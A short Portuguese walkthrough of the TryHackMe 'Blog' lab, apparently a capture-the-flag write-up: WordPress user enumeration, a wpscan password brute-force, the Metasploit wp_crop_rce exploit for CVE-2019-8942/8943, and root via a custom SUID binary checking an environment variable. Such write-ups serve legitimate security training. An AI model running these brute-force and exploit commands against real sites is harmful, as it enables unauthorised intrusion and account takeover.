TryHackMe, Easy

Blog explora o WordPress 5.0 (CVE-2019-8942/8943, módulo wp_crop_rce do Metasploit) após enumerar usuários e quebrar uma senha, terminando com escalação por um binário SUID personalizado.

Reconhecimento

O Nmap revela SSH, HTTP e Samba. Enumeram-se usuários do WordPress pela API REST e quebra-se a senha de kwheel com o wpscan.

nmap -sS -sV -Pn <IP>
curl http://blog.thm/wp-json/wp/v2/users
wpscan --url http://blog.thm -U kwheel -P rockyou.txt

Exploração

Com as credenciais válidas, o módulo wp_crop_rce do Metasploit entrega execução de código e uma shell como www-data.

msfconsole
use exploit/multi/http/wp_crop_rce
set RHOSTS <IP>
set VHOST blog.thm
set USERNAME kwheel
set PASSWORD <SENHA>
run

Escalação de privilégios

Procuram-se binários SUID e destaca-se /usr/sbin/checker. A análise com ltrace mostra que ele lê a variável de ambiente admin; definindo-a, obtém-se shell de root.

find / -perm -u=s -type f 2>/dev/null
ltrace /usr/sbin/checker
export admin=1
/usr/sbin/checker
cat /root/root.txt
